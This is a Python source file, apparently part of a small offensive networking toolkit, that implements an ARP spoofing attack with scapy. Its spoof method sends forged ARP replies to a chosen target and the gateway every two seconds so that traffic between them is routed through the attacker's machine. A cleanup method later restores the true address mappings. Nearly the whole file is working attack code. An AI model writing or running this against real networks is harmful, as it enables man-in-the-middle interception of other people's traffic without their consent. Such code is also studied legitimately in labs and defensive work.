import scapy.all as scapy
from cSubprocess import *
from networking import *
from exporting import *;
import time 

class ArpSpoofer:
    default_gateway_ip = None
    target_ethernet = None
    gateway_ethernet = None

    def __init__(self):
        pass

    # Method to remove an IP address from our own ARP cache
    def rm_address_arp_cache(self, ip_address):
        command = 'arp -d ' + ip_address
        clean_subprocess(command, -1)

    # Method to create Ethernet routing frames
    def create_ether_packets(self, target_mac, gateway_mac):
        # Create target / gateway routing packets
        self.target_ethernet = scapy.Ether(dst=target_mac)
        self.gateway_ethernet = scapy.Ether(dst=gateway_mac)
    
    # Method to restore ARP tables of all devices
    def cleanup(self, gateway_ip, target_ip):
        print(" cleaning up and exiting arpspoof...\n")

        target_mac = get_mac_address(target_ip)
        gateway_mac = get_mac_address(gateway_ip)

        # Send original IP-MAC pairs to tables in target / gateway
        target_arp = scapy.ARP(op = 2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip , hwdst=target_mac)
        gateway_arp = scapy.ARP(op = 2, psrc=target_ip, hwsrc=target_mac , pdst=gateway_ip, hwdst=gateway_mac)

        # Combine the Ethernet frame with the ARP packet
        target_packet = self.target_ethernet / target_arp
        gateway_packet = self.gateway_ethernet / gateway_arp

        # Show the packets
        print(target_packet.show())
        print(gateway_packet.show())

        # Send the packets to target / gateway
        scapy.sendp(target_packet, iface="eth0")
        scapy.sendp(gateway_packet, iface="eth0")

    # Method to spoof ARP tables for target and gateway devices
    def spoof(self, gateway_ip, target_ip):
        try:
            while True:
                target_mac = get_mac_address(target_ip)
                gateway_mac = get_mac_address(gateway_ip)

                self.create_ether_packets(target_mac, gateway_mac) # Create routing frames

                target_arp = scapy.ARP(op = 2, psrc=gateway_ip, pdst=target_ip , hwdst=target_mac)
                gateway_arp = scapy.ARP(op = 2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

                # Combine the Ethernet frame with the ARP packet
                target_packet = self.target_ethernet / target_arp
                gateway_packet = self.gateway_ethernet / gateway_arp

                # Show the packets
                print(target_packet.show())
                print(gateway_packet.show())

                # Send the spoofed arp reply packets to target / gateway
                scapy.sendp(target_packet, iface="eth0")
                scapy.sendp(gateway_packet, iface="eth0")

                time.sleep(2) # Resend packets every 2 seconds
        except:
            print("Something went wrong while spoofing...")